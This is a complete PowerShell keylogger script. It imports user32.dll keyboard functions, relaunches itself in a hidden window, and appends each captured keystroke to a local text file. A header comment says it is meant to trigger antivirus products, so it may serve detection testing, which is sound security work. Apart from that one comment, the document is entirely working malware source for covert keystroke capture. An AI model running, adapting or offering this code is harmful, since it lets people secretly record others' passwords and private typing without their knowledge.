# use it to trigger AV solutions /!\
# Assigns the path for the keylogger file
$path = "C:\FIXME\keylogs.txt"

# Creates the keylogger file if it doesn't already exist
if ((Test-Path $path) -eq $false) {New-Item $path}

# Declares the signatures of the imported methods
$signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

# Creates the API type used for importing the methods
$API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru

# Make the script run invisibly
$wsh = New-Object -ComObject WScript.Shell
$wsh.Run("powershell.exe -WindowStyle Hidden -File $MyInvocation.MyCommand.Path", 0, $false)

# Enter a loop to check for keyboard input
try {
    while ((Test-Path $path) -ne $false){
        # Waits for 40 milliseconds before checking for input
        Start-Sleep -Milliseconds 40
        
        # Iterates through each character (ascii value 9-254)
        for ($ascii = 9; $ascii -le 254; $ascii++) {
            # Gets the state of the current key
            $state = $API::GetAsyncKeyState($ascii)
            # If the key has been pressed
            if ($state -eq -32767) {
                # Checks for CapsLock
                $null = [console]::CapsLock
                # Maps the virtual key code
                $virtualKey = $API::MapVirtualKey($ascii, 3)
                # Creates an array of 256 bytes
                $kbstate = New-Object -TypeName Byte[] -ArgumentList 256
                # Gets the keyboard state
                $checkkbstate = $API::GetKeyboardState($kbstate)
                # Creates a new string builder
                $mychar = New-Object -TypeName System.Text.StringBuilder
                # Converts the virtual key code to a unicode character
                $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
                # If conversion is successful and the file still exists
                if ($success -and (Test-Path $path) -eq $true) {
                    # Appends the unicode character to the keylogger file
                    [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)
                }
            }
        }
    } 
} finally {exit}
